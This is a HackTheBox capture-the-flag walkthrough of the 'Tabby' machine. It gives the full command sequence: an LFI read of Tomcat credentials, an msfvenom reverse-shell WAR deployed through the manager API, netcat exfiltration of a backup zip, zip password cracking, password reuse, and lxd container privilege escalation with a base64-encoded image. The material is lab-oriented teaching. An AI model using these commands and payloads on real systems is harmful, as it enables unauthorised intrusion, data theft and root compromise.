---
title: HTB: Tabby
url: https://0xdf.gitlab.io/2020/11/07/htb-tabby.html
date: 2020-11-07T14:45:00+00:00
difficulty: Easy [20]
os: Linux
tags: htb-tabby, hackthebox, ctf, lfi, php, gobuster, tomcat, host-manager, tomcat-manager, war, msfvenom, password-reuse, credentials, zip2john, john, hashcat, penglab, lxc, lxd, reverse-engineering, htb-jerry, htb-teacher, htb-popcorn, htb-lightweight, htb-sunday, htb-mischief, htb-obscurity, oscp-like-v2
---

![Tabby](https://0xdfimages.gitlab.io/img/tabby-cover.png)

Tabby was a well designed easy level box that required finding a local file include (LFI) in a website to leak the credentials for the Tomcat server on that same host. The user who’s creds I gain access to only has access to the command line manager API, not the GUI, but I can use that to upload a WAR file, get execution, and a shell. I’ll crack the password on a backup zip archive and then use that same password to change to the next user. That user is a member of the lxd group, which allows them to start containers. I’ve shown this root before, but this time I’ll include a really neat trick from m0noc that saves several steps. In Beyond Root, I’ll pull apart the WAR file and show what’s actually in it.

## Box Info

| Name | [Tabby](https://hackthebox.com/machines/tabby)  [Tabby](https://hackthebox.com/machines/tabby) [Play on HackTheBox](https://hackthebox.com/machines/tabby) |
| --- | --- |
| Release Date | [20 Jun 2020](https://twitter.com/hackthebox_eu/status/1273989174203482112) |
| Retire Date | 07 Nov 2020 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Tabby |
| Radar Graph | Radar chart for Tabby |
| First Blood User | 01:15:25[Doridian Doridian](https://app.hackthebox.com/users/310032) |
| First Blood Root | 01:15:14[Doridian Doridian](https://app.hackthebox.com/users/310032) |
| Creator | [egre55 egre55](https://app.hackthebox.com/users/1190) |

## Recon

### nmap

`nmap` found three open TCP ports, SSH (22), HTTP Apache (80), and HTTP Tomcat (8080):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.194
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-22 15:38 EDT
Nmap scan report for 10.10.10.194
Host is up (0.017s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 8.31 seconds

root@kali# nmap -p 80,8080,22 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.194
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-22 15:38 EDT
Nmap scan report for 10.10.10.194
Host is up (0.011s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.30 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 20.04 Groovy. Tomcat isn’t surprising given the box name.

### Website - TCP 80

#### Site

The site is a hosting company:

[![image-20200622154515612](https://0xdfimages.gitlab.io/img/image-20200622154515612.png)](https://0xdfimages.gitlab.io/img/image-20200622154515612.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20200622154515612.png)

Most of the links on the page are dead, but there’s a couple that point to urls like `http://megahosting.htb/news.php?file=statement`.

I’ll add `megahosting.htb` to my `/etc/hosts` file:

```
10.10.10.194 megahosting.htb

```

The site is the same, but now the links work.

#### news.php

The news link goes to `http://megahosting.htb/news.php?file=statement`, which loads a statement about a breach, and how the news tool is not longer there:

![image-20200622161504359](https://0xdfimages.gitlab.io/img/image-20200622161504359.png)

#### Directory Brute Force

I’ll run `gobuster` against the site, and include `-x php` since I know the site is PHP:

```

root@kali# gobuster dir -u http://10.10.10.194 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 40 -o scans/gobuster-root-
med
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.194
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/06/22 15:44:44 Starting gobuster
===============================================================
/news.php (Status: 200)
/index.php (Status: 200)
/files (Status: 301)
/assets (Status: 301)
/server-status (Status: 403)
===============================================================
2020/06/22 15:47:52 Finished
===============================================================

```

Nothing new here.

### Tomcat - TCP 8080

The page on 8080 is a default [Apache Tomcat](http://tomcat.apache.org/) demo page:

![image-20200622170225550](https://0xdfimages.gitlab.io/img/image-20200622170225550.png)

The page is not totally worthless. It provides links to the manager webapp and host-manager webapps. Both pop basic auth prompts on visiting. It also gives a hint about where users are defined and what roles are necessary to access the various webapps.

## Shell as tomcat

### Get Tomcat Creds

#### Identify LFI

The URL in `news.php` is suspicious - the argument `file` suggests it’s including a file. I’ll check for local file include (LFI) by visiting `http://megahosting.htb/news.php?file=../../../../etc/passwd`:

![image-20200622170108801](https://0xdfimages.gitlab.io/img/image-20200622170108801.png)

I definitely have a local file include here.

#### Find tomcat-users.xml

The Tomcat page at the root of TCP 8080 says:

> Users are defined in `/etc/tomcat9/tomcat-users.xml`.

That seems like an obvious place to look. But nothing comes back:

```

root@kali# curl http://megahosting.htb/news.php?file=../../../../etc/tomcat9/tomcat-users.xml

```

After guessing around and Googling a bit, I just installed Tomcat with `apt install tomcat9`. Then I used `find` to look for `tomcat-users.xml`, and got two results:

```

root@kali# find / -name tomcat-users.xml
/usr/share/tomcat9/etc/tomcat-users.xml
/etc/tomcat9/tomcat-users.xml

```

Taking new path to Tabby finds the file (displayed pretty in Firefox view-source):

![image-20200622203509614](https://0xdfimages.gitlab.io/img/image-20200622203509614.png)

I’ve got a single user, tomcat, with a password, “$3cureP4s5w0rd123!”, and the roles `admin-gui` and `manager-script`.

### Fails in host-manager

Both the manager webapp and host-manager webapps have links from the default Tomcat page. I was able to confirm this bit from that page:

> NOTE: For security reasons, using the manager webapp is restricted to users with role “manager-gui”. The host-manager webapp is restricted to users with role “admin-gui”. Users are defined in `/etc/tomcat9/tomcat-users.xml`.

The user tomcat has `admin-gui`, but not `manager-gui`, which means I can’t access the manager webapp:

![image-20200622204040089](https://0xdfimages.gitlab.io/img/image-20200622204040089.png)

But I can access the host-manager webapp:

[![image-20200622204142330](https://0xdfimages.gitlab.io/img/image-20200622204142330.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200622204142330.png)

This page is for adding virtual hosts and assigning them an app. I tried a few things that all failed:
- [This page](https://www.certilience.fr/2019/03/tomcat-exploit-variant-host-manager/) suggests that using a UNC path to an SMB share on my hosts for the App base to get it to load a malicious app, but that doesn’t work. I suspect it works in the blog post because Tomcat is hosted on a Windows machine. For me, the path it tries to work from makes no sense:

  ![image-20200622204425956](https://0xdfimages.gitlab.io/img/image-20200622204425956.png)

</picture>
- I tried adding PHP code to various fields. I didn’t really expect it to run on the Tomcat server (and it didn’t). It didn’t even come through right, as it added `,` after each space:

  ![image-20200622204602500](https://0xdfimages.gitlab.io/img/image-20200622204602500.png)

</picture>
- I thought maybe I could save the config with the PHP in it, and then access it with the LFI from TCP 80, but when I tried to save the config, it fails:

  ![image-20200622204643977](https://0xdfimages.gitlab.io/img/image-20200622204643977.png)

</picture>

### Text-based manager

The tomcat user did have another permission, `manager-script`. This is to allow access to the text-based web service located at `/manager/text`. There’s a list of commands [here](http://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html#Supported_Manager_Commands).

I can test it out with `list` and it works:

```

root@kali# curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/list
OK - Listed applications for virtual host [localhost]
/:running:0:ROOT
/examples:running:0:/usr/share/tomcat9-examples/examples
/host-manager:running:0:/usr/share/tomcat9-admin/host-manager
/manager:running:0:/usr/share/tomcat9-admin/manager
/docs:running:0:/usr/share/tomcat9-docs/docs

```

Now that I have access to the manager (even if not through the GUI)

### Deploy Malicious War

#### Generate Payload

With access to Tomcat Manager, I can proceed the with a malicious `.war` upload just like in [Jerry](/2018/11/17/htb-jerry.html#exploiting-tomcat), but here I’ll use the text-based manager application to deploy it. I’ll generate a payload with `msfvenom` to get a simple reverse shell:

```

root@kali# msfvenom -p java/shell_reverse_tcp lhost=10.10.14.18 lport=443 -f war -o rev.10.10.14.18-443.war
Payload size: 13398 bytes
Final size of war file: 13398 bytes
Saved as: rev.10.10.14.18-443.war

```

#### Upload Payload

Now I’ll use `curl` to send the payload. I’ll need to give it the application path (url), and send the payload using an HTTP PUT request. In `curl`, I’ll use `-T` or `--upload-file` to signify a PUT request:

> ```

>    -T, --upload-file <file>
>           This transfers the specified local file to the remote URL. If there is no file part in the specified URL, curl will append the local file name.  NOTE  that  you
>           must  use  a  trailing / on the last directory to really prove to Curl that there is no file name or curl will think that your last directory name is the remote
>           file name to use. That will most likely cause the upload operation to fail. If this is used on an HTTP(S) server, the PUT command will be used.
>
> ```

I’ll deploy the payload with:

```

root@kali# curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/deploy?path=/0xdf --upload-file rev.10.10.14.18-443.war 
OK - Deployed application at context path [/0xdf]

```

That’s:
- `-u 'tomcat:$3cureP4s5w0rd123!'` - the creds
- `/manager/text/deploy` - text-based path for `deploy` command
- `?path=/0xdf` - the path I want the application to live at
- `--upload-file rev.10.10.14.18-443.war` - war file to upload with HTTP PUT

The results suggest it worked. I’ll start `nc`, and then trigger it with `curl http://10.10.10.194:8080/0xdf`. I get a connection back with a shell:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.194.
Ncat: Connection from 10.10.10.194:37000.
id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)

```

### Shell Upgrade

I’ll upgrade to a PTY, with tab complete and arrow keys:

```

python3 -c 'import pty;pty.spawn("bash")'
tomcat@tabby:/var/lib/tomcat9$ ^Z
[1]+  Stopped                 nc -lnvp 443
root@kali# stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
tomcat@tabby:/var/lib/tomcat9$ 

```

## Priv: tomcat –> ash

### Enumeration

In the web directory, `/var/www/html`, `news.php` (which contained the the LFI vulnerability), is supposed to load files from the `files` directory.

```

<?php
$file = $_GET['file'];
$fh = fopen("files/$file","r");
while ($line = fgets($fh)) {
  echo($line);
}
fclose($fh);
?>

```

In `files`, there’s `statement`, but also a backup file owned by ash:

```

tomcat@tabby:/var/www/html/files$ ls -l                                                  
total 28                                    
-rw-r--r-- 1 ash  ash  8716 Jun 16 13:42 16162020_backup.zip                             
drwxr-xr-x 2 root root 4096 Jun 16 20:13 archive                                         
drwxr-xr-x 2 root root 4096 Jun 16 20:13 revoked_certs
-rw-r--r-- 1 root root 6507 Jun 16 11:25 statement

```

### Access Archive

#### Exfil

I copied `161612020_backup.zip` it into `/dev/shm` and tried to `unzip`, but it needs a password.

I exfiled it back to my own machine, starting `nc` on my machine, and then running:

```

tomcat@tabby:/var/www/html/files$ md5sum 16162020_backup.zip                             
f0a0af346ad4495cfdb01bd5173b0a52  16162020_backup.zip 
tomcat@tabby:/var/www/html/files$ cat 16162020_backup.zip | nc 10.10.14.18 443

```

I also got the hash so I could make sure I got the file without corruption. Back at my host, the file comes in, and the hashes match:

```

root@kali# nc -lnvp 443 > 16162020_backup.zip
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.194.
Ncat: Connection from 10.10.10.194:37002.
^C
root@kali# md5sum 16162020_backup.zip 
f0a0af346ad4495cfdb01bd5173b0a52  16162020_backup.zip

```

#### Crack

To crack the password, I’ll use `zip2john` to create a hash:

```

root@kali# zip2john 16162020_backup.zip > 16162020_backup.zip.john
16162020_backup.zip/var/www/html/assets/ is not encrypted!  
ver 1.0 16162020_backup.zip/var/www/html/assets/ is not encrypted, or stored with non-handled compression type                                                                     
ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/favicon.ico PKZIP Encr: 2b chk, TS_chk, cmplen=338, decmplen=766, crc=282B6DE2
ver 1.0 16162020_backup.zip/var/www/html/files/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/index.php PKZIP Encr: 2b chk, TS_chk, cmplen=3255, decmplen=14793, crc=285CC4D6
ver 1.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/logo.png PKZIP Encr: 2b chk, TS_chk, cmplen=2906, decmplen=2894, crc=2F9F45F                                            
ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/news.php PKZIP Encr: 2b chk, TS_chk, cmplen=114, decmplen=123, crc=5C67F19E                                             
ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/Readme.txt PKZIP Encr: 2b chk, TS_chk, cmplen=805, decmplen=1574, crc=32DB9CE3
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.

```

Then I can pass it to `john` with `rockyou` and it breaks instantly:

```

root@kali# john 16162020_backup.zip.john --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
admin@it         (16162020_backup.zip)
1g 0:00:00:00 DONE (2020-06-22 21:21) 1.030g/s 10679Kp/s 10679Kc/s 10679KC/s adorovospessoal..adilizrar
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

I could have also used `hashcat`. First I will add a `cut` on the `zip2john` output:

```

root@kali# zip2john 16162020_backup.zip | cut -d: -f2 > 16162020_backup.zip.hash
...[snip]...

```

The hash matches the format 17225 from the [example hashes page](https://hashcat.net/wiki/doku.php?id=example_hashes). That hash isn’t know to the version of `hashcat` on my instance of Kali, but it works in mxrch’s [penglab](https://github.com/rvrsh3ll/penglab) (my notebook is slightly modified):

[![image-20200622213307729](https://0xdfimages.gitlab.io/img/image-20200622213307729.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200622213307729.png)

### su

I was a bit confused when looking through the archive. There wasn’t anything useful in it. Then it occurred to me that ash may have reused his password. I ran `su`, and it worked:

```

tomcat@tabby:/var/www/html$ su - ash
Password: 
ash@tabby:~$

```

From here I could grab `user.txt`:

```

ash@tabby:~$ cat user.txt
a4a96fdb************************

```

## Priv: ash –> root

### Enumeration

The first command I run in basically every Linux shell is `id`. It not only shows not only who the shell is running as, but also that users groups:

```

ash@tabby:~$ id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)

```

In this case, `adm` is interesting (it allows me to read log files), but I’m immediately drawn to `lxd`. This group was an unintentional (and eventually patched) path to root in both [mischief](/2019/01/05/htb-mischief.html#option-3---lxc-patched) and [obscurity](/2020/05/09/htb-obscurity.html#patched-path-4-lxd), but here is actually the intended path. Since originally solving, I came across a really slick way to do this even better, so I’ll show both the standard way and the upgrade.

### LXC Exploitation

The basic idea is that I can create a container and mount the root file system on Tabby into the container, where I then have full access to it.

There are currently no containers on the host:

```

ash@tabby:/tmp$ lxc list                                                                                                                                                           
+------+-------+------+------+------+-----------+                                        
| NAME | STATE | IPV4 | IPV6 | TYPE | SNAPSHOTS |    
+------+-------+------+------+------+-----------+ 

```

I’ll need to bring a container to Tabby. I’ll grab the [LXD Alpina Linux image builder](https://github.com/saghul/lxd-alpine-builder) by running `git clone [path to repo]` in my `/opt` directory. This tool creates an Alpine Linux container image. I could do this with an OS flavor, but Alpine is nice because it’s really stripped down and small. I’ll go into that directory and run the builder:

```

root@kali:/opt/lxd-alpine-builder# ./build-alpine
Determining the latest release... v3.12                                                  
Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.12/main/x86_64
Downloading alpine-mirrors-3.5.10-r0.apk
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
Downloading alpine-keys-2.2-r0.apk
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'                  
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'                  
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'   
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'                  
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'                  
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'                  
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'                  
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'                  
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'      
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'                  
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
Downloading apk-tools-static-2.10.5-r1.apk                                               
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
alpine-devel@lists.alpinelinux.org-4a6a0840.rsa.pub: OK                
Verified OK                                                                              
Selecting mirror http://dl-5.alpinelinux.org/alpine/v3.12/main         
fetch http://dl-5.alpinelinux.org/alpine/v3.12/main/x86_64/APKINDEX.tar.gz
(1/19) Installing musl (1.1.24-r9)                                                       
(2/19) Installing busybox (1.31.1-r19)                                                   
Executing busybox-1.31.1-r19.post-install                                                
(3/19) Installing alpine-baselayout (3.2.0-r7)                         
Executing alpine-baselayout-3.2.0-r7.pre-install                       
Executing alpine-baselayout-3.2.0-r7.post-install                      
(4/19) Installing openrc (0.42.1-r10)                                                    
Executing openrc-0.42.1-r10.post-install                                                 
(5/19) Installing alpine-conf (3.9.0-r1)                                                 
(6/19) Installing libcrypto1.1 (1.1.1g-r0)                                               
(7/19) Installing libssl1.1 (1.1.1g-r0)                                                  
(8/19) Installing ca-certificates-bundle (20191127-r4)                 
(9/19) Installing libtls-standalone (2.9.1-r1)                         
(10/19) Installing ssl_client (1.31.1-r19)                                               
(11/19) Installing zlib (1.2.11-r3)                                                      
(12/19) Installing apk-tools (2.10.5-r1)                                                 
(13/19) Installing busybox-suid (1.31.1-r19)                           
(14/19) Installing busybox-initscripts (3.2-r2)        
Executing busybox-initscripts-3.2-r2.post-install                                        
(15/19) Installing scanelf (1.2.6-r0)                                                    
(16/19) Installing musl-utils (1.1.24-r9)                                                
(17/19) Installing libc-utils (0.7.2-r3)                                                 
(18/19) Installing alpine-keys (2.2-r0)                                                  
(19/19) Installing alpine-base (3.12.0-r0)                                               
Executing busybox-1.31.1-r19.trigger                                                     
OK: 8 MiB in 19 packages 

```

When it finishes, there’s a `.tar.gz` package containing the files necessary to make an Alpine Linux container.

I’ll upload this to Tabby by running a Python webserver on my host (`python3 -m http.server 80`) and then running `wget` from Tabby:

```

ash@tabby:/dev/shm$ wget 10.10.14.18/alpine-v3.12-x86_64-20200623_0622.tar.gz
--2020-06-23 12:17:39--  http://10.10.14.18/alpine-v3.12-x86_64-20200623_0622.tar.gz
Connecting to 10.10.14.18:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3219042 (3.1M) [application/gzip]
Saving to: ‘alpine-v3.12-x86_64-20200623_0622.tar.gz’

alpine-v3.12-x86_64 100%[===================>]   3.07M  9.23MB/s    in 0.3s    

2020-06-23 12:17:39 (9.23 MB/s) - ‘alpine-v3.12-x86_64-20200623_0622.tar.gz’ saved [3219042/3219042]

```

Next I’ll import the image into `lxc`:

```

ash@tabby:/dev/shm$ lxc image import /dev/shm/alpine-v3.12-x86_64-20200623_0622.tar.gz --alias 0xdf-image
If this is your first time running LXD on this machine, you should also run: lxd init
To start your first instance, try: lxc launch ubuntu:18.04

Image imported with fingerprint: 8acac69131bcf6667369fa31360204fd255275b4bee3b7f98a64c6c23cbe4e5f

```

As the message suggests, I’ll need to run `lxd init`. I can just accept all the defaults:

```

ash@tabby:/dev/shm$ lxd init
Would you like to use LXD clustering? (yes/no) [default=no]: 
Do you want to configure a new storage pool? (yes/no) [default=yes]: 
Name of the new storage pool [default=default]: Name of the storage backend to use (dir, lvm, ceph, btrfs) [default=btrfs]: Create a new BTRFS pool? (yes/no) [default=yes]: Would you like to use an existing block device? (yes/no) [default=no]: 
Size in GB of the new loop device (1GB minimum) [default=15GB]: 
Would you like to connect to a MAAS server? (yes/no) [default=no]: 
Would you like to create a new local network bridge? (yes/no) [default=yes]: 
What should the new bridge be called? [default=lxdbr0]: 
What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
Would you like LXD to be available over the network? (yes/no) [default=no]: 
Would you like stale cached images to be updated automatically? (yes/no) [default=yes] 
Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: 

```

Now I’ll create a container from the image with the following options:
- `init` - action to take, starting a container
- `0xdf-image` - the image to start
- `container-0xdf` - the alias for the running container
- `-c security.privileged=true` - by default, containers run as a non-root UID; this runs the container as root, giving it access to the host filesystem as root

```

ash@tabby:/dev/shm$ lxc init 0xdf-image container-0xdf -c security.privileged=true
Creating container-0xdf

```

I’ll also mount part of the host file system into the container. This is useful to have a shared folder between the two. I’ll abuse it by mounting the host system root:

```

ash@tabby:/dev/shm$ lxc config device add container-0xdf device-0xdf disk source=/ path=/mnt/root
Device device-0xdf added to container-0xdf

```

Now the container is setup and ready, just not running:

```

ash@tabby:/dev/shm$ lxc list               
+----------------+---------+------+------+-----------+-----------+
|      NAME      |  STATE  | IPV4 | IPV6 |   TYPE    | SNAPSHOTS |
+----------------+---------+------+------+-----------+-----------+
| container-0xdf | STOPPED |      |      | CONTAINER | 0         |
+----------------+---------+------+------+-----------+-----------+

```

I’ll start the container:

```

ash@tabby:/dev/shm$ lxc start container-0xdf
ash@tabby:/dev/shm$ lxc list                
+----------------+---------+----------------------+-----------------------------------------------+-----------+-----------+
|      NAME      |  STATE  |         IPV4         |                     IPV6                      |   TYPE    | SNAPSHOTS |
+----------------+---------+----------------------+-----------------------------------------------+-----------+-----------+
| container-0xdf | RUNNING | 10.227.81.251 (eth0) | fd42:dc54:f291:9c6d:216:3eff:fe84:fe35 (eth0) | CONTAINER | 0         |
+----------------+---------+----------------------+-----------------------------------------------+-----------+-----------+

```

The following `lxc exec` command returns a root shell inside the container:

```

ash@tabby:/dev/shm$ lxc exec container-0xdf /bin/sh
~ # id
uid=0(root) gid=0(root)

```

The shell is inside the container:

```

~ # cat /etc/hostname 
container-0xdf

```

But moving into the mounted part, I find the host file system:

```

~ # cd /mnt/root/
/mnt/root # ls
bin         dev         lib         libx32      mnt         root        snap        sys         var
boot        etc         lib32       lost+found  opt         run         srv         tmp
cdrom       home        lib64       media       proc        sbin        swap.img    usr
/mnt/root # cat etc/hostname 
tabby

```

I can grab `root.txt`:

```

/mnt/root # cd root/
/mnt/root/root # cat root.txt
cccf5325************************

```

With full file system access on the host, there are a lot of ways to get a shell. I could edit `/etc/passwd` (like in [Teacher](/2019/04/20/htb-teacher.html#etcpasswd) or in [Popcorn](/2020/06/23/htb-popcorn.html#manual-exploit)), edit the `/etc/sudoers` file (like in [Lightweight](/2019/05/11/htb-lightweight.html#root-shell) or [Sunday](/2018/09/29/htb-sunday.html#overwrite-sudoers)). Another simple trick I haven’t shown before is just to set `bash` to SUID so that it runs as root:

```

/mnt/root/usr/bin # ls -l bash
-rwxr-xr-x    1 root     root       1183448 Feb 25 12:03 bash
/mnt/root/usr/bin # chmod 4755 bash
/mnt/root/usr/bin # ls -l bash
-rwsr-xr-x    1 root     root       1183448 Feb 25 12:03 bash

```

Notice the forth character changed from `x` to `s`.

Now I can exit the container and run `bash -p` to get a root shell (notice the effective uid, `euid`):

```

ash@tabby:/dev/shm$ bash -p
bash-5.0# id
uid=1000(ash) gid=1000(ash) euid=0(root) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)

```

### Better LXC Root

m0noc wrote [this amazing post](https://blog.m0noc.com/2018/10/lxc-container-privilege-escalation-in.html?m=1) about a better way to do the LXC exploitation. In the previous section, I brought a container to the system and ran it. I tried to go with the smallest container I could (Apline), but it was still a full file system. m0noc looked at removing as much from the image as possible where it could rely on mapping files in from the host OS. In the end, he gets the necessary container down to a 656 byte base64-encoded string.

Now I can just echo this string into `base64 -d` and save it as a file, creating the 656 byte image:

```

ash@tabby:/dev/shm$ echo QlpoOTFBWSZTWaxzK54ABPR/p86QAEBoA//QAA3voP/v3+AACAAEgACQAIAIQAK8KAKCGURPUPJGRp6gNAAAAGgeoA5gE0wCZDAAEwTAAADmATTAJkMAATBMAAAEiIIEp5CepmQmSNNqeoafqZTxQ00HtU9EC9/dr7/586W+tl+zW5or5/vSkzToXUxptsDiZIE17U20gexCSAp1Z9b9+MnY7TS1KUmZjspN0MQ23dsPcIFWwEtQMbTa3JGLHE0olggWQgXSgTSQoSEHl4PZ7N0+FtnTigWSAWkA+WPkw40ggZVvYfaxI3IgBhip9pfFZV5Lm4lCBExydrO+DGwFGsZbYRdsmZxwDUTdlla0y27s5Euzp+Ec4hAt+2AQL58OHZEcPFHieKvHnfyU/EEC07m9ka56FyQh/LsrzVNsIkYLvayQzNAnigX0venhCMc9XRpFEVYJ0wRpKrjabiC9ZAiXaHObAY6oBiFdpBlggUJVMLNKLRQpDoGDIwfle01yQqWxwrKE5aMWOglhlUQQUit6VogV2cD01i0xysiYbzerOUWyrpCAvE41pCFYVoRPj/B28wSZUy/TaUHYx9GkfEYg9mcAilQ+nPCBfgZ5fl3GuPmfUOB3sbFm6/bRA0nXChku7aaN+AueYzqhKOKiBPjLlAAvxBAjAmSJWD5AqhLv/fWja66s7omu/ZTHcC24QJ83NrM67KACLACNUcnJjTTHCCDUIUJtOtN+7rQL+kCm4+U9Wj19YXFhxaXVt6Ph1ALRKOV9Xb7Sm68oF7nhyvegWjELKFH3XiWstVNGgTQTWoCjDnpXh9+/JXxIg4i8mvNobXGIXbmrGeOvXE8pou6wdqSD/F3JFOFCQrHMrng= | base64 -d > bob.tar.bz2
ash@tabby:/dev/shm$ ls -l
total 4
-rw-rw-r-- 1 ash ash 656 Nov  4 12:40 bob.tar.bz2

```

If I haven’t already done it above, I’ll run `lxd init` and accept all the defaults to initialize:

```

ash@tabby:/dev/shm$ lxd init
Would you like to use LXD clustering? (yes/no) [default=no]: 
Do you want to configure a new storage pool? (yes/no) [default=yes]: 
Name of the new storage pool [default=default]: 
Name of the storage backend to use (dir, lvm, ceph, btrfs) [default=btrfs]: 
Create a new BTRFS pool? (yes/no) [default=yes]: 
Would you like to use an existing block device? (yes/no) [default=no]: 
Size in GB of the new loop device (1GB minimum) [default=15GB]: 
Would you like to connect to a MAAS server? (yes/no) [default=no]: 
Would you like to create a new local network bridge? (yes/no) [default=yes]: 
What should the new bridge be called? [default=lxdbr0]: 
What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
Would you like LXD to be available over the network? (yes/no) [default=no]: 
Would you like stale cached images to be updated automatically? (yes/no) [default=yes] 
Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]:

```

Now I’ll import the imiage, create it, add the host file system, and start the image:

```

ash@tabby:/dev/shm$ lxc image import bob.tar.bz2 --alias bobImage
ash@tabby:/dev/shm$ lxc init bobImage bobVM -c security.privileged=true
Creating bobVM
ash@tabby:/dev/shm$ lxc config device add bobVM realRoot disk source=/ path=r
Device realRoot added to bobVM
ash@tabby:/dev/shm$ lxc start bobVM

```

With success there, I can get a shell and access the root filesystem and the flag:

```

ash@tabby:/dev/shm$ lxc exec bobVM -- /bin/sh
# cd /r
# ls
bin    dev   lib    libx32      mnt   root  snap      sys  var
boot   etc   lib32  lost+found  opt   run   srv       tmp
cdrom  home  lib64  media       proc  sbin  swap.img  usr
# cd root
# ls
root.txt  snap
# cat root.txt
09212c70************************

```

## Beyond Root - What is WAR

I used a `.war` file generated by `msfvenom` to get execution on Tabby. So what’s in a war? It’s really just a zip archive:

```

root@kali# file rev.10.10.14.18-443.war 
rev.10.10.14.18-443.war: Zip archive data, at least v2.0 to extract

```

I can unzip it:

```

root@kali# unzip rev.10.10.14.18-443.war 
Archive:  rev.10.10.14.18-443.war
   creating: WEB-INF/
  inflating: WEB-INF/web.xml         
   creating: WEB-INF/classes/
